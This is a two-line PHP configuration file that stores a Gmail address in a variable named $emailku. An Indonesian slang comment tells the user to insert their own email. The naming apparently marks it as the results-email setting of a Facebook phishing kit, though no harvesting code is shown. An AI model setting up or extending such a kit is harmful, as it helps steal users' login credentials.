<?php
$emailku = 'facebookbae11@gmail.com'; // masukin email lu disini coeng -_-
?>